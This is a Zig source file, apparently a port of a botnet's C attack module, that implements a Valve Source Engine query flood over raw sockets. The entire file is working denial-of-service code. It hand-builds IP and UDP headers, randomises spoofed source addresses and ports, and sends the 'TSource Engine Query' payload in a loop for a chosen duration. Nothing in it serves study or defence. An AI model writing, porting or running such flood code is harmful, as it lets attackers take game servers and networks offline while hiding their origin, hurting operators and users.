//! # VSE (Valve Source Engine) Flood - Raw Socket Version
//!
//! Raw socket VSE query flood with IP spoofing.
//!
//! ## C Reference: modules/attack/methods/vse.c (78 lines)

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

const IPPROTO_UDP: u8 = 17;

// ============================================================
// VSE PAYLOAD (from C: vse.c lines 17-20)
// ============================================================

const vse_payload = [_]u8{
    0xFF, 0xFF, 0xFF, 0xFF,
    0x54, 0x53, 0x6f, 0x75,
    0x72, 0x63, 0x65, 0x20,
    0x45, 0x6e, 0x67, 0x69,
    0x6e, 0x65, 0x20, 0x51,
    0x75, 0x65, 0x72, 0x79,
    0x00,
};

// ============================================================
// IP + UDP HEADERS
// ============================================================

const IpHeader = packed struct {
    version_ihl: u8,
    tos: u8,
    tot_len: u16,
    id: u16,
    frag_off: u16,
    ttl: u8,
    protocol: u8,
    check: u16,
    saddr: u32,
    daddr: u32,
};

const UdpHeader = packed struct {
    sport: u16,
    dport: u16,
    len: u16,
    check: u16,
};

// ============================================================
// VSE RAW FLOOD (from C: vse.c attack_udp_vse lines 22-77)
// ============================================================

pub fn attackVseRaw(ip: u32, port: u16, duration: u32) void {
    // Create raw socket (from C: lines 23-27)
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_UDP) catch return;
    defer posix.close(sock);

    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    // Packet: IP(20) + UDP(8) + Payload(25) = 53 bytes
    const PACKET_SIZE = 53;

    // Pre-fill static parts (from C: lines 38-56)
    var packet: [PACKET_SIZE]u8 = undefined;
    @memset(&packet, 0);

    const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
    iph.version_ihl = 0x45;
    iph.tos = 0;
    iph.tot_len = std.mem.nativeToBig(u16, PACKET_SIZE);
    iph.frag_off = 0;
    iph.ttl = 255;
    iph.protocol = IPPROTO_UDP;
    iph.daddr = ip;

    const udph = @as(*UdpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
    udph.dport = std.mem.nativeToBig(u16, port);
    udph.len = std.mem.nativeToBig(u16, 8 + vse_payload.len);
    udph.check = 0;

    // Copy payload once (from C: lines 55-56)
    @memcpy(packet[28..53], &vse_payload);

    while (std.time.timestamp() < end_time) {
        // Rotate source IP/port (from C: lines 62-67)
        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random spoofed source
        iph.id = std.mem.nativeToBig(u16, @truncate(rng.next()));
        udph.sport = std.mem.nativeToBig(u16, @truncate(rng.next()));

        // Recalculate IP checksum (from C: lines 71-72)
        iph.check = 0;
        iph.check = crypto.internetChecksum(packet[0..20]);

        // Send (from C: line 74)
        var dest: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = std.mem.nativeToBig(u16, port),
            .addr = ip,
        };

        _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
    }
}
